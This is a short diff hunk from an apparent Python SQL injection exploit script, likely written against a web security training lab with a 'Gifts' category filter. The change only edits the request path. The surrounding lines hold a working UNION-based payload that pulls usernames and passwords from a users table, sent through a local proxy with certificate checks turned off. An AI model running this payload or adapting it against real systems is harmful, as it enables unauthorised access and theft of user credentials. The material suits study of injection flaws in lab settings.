@@ -9,7 +9,7 @@ proxies = {'http': 'http://127.0.01:8080', 'https': 'https://127.0.01:8080'}
 
 def exploit_sqli_users_table(url):
     username = 'administrator'
-    path = '/filter?category=Gifts'
+    path = 'filter?category=Gifts'
     sql_payload = "' UNION select NULL, username||'**'|| password from users--"
     r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
     res = r.text
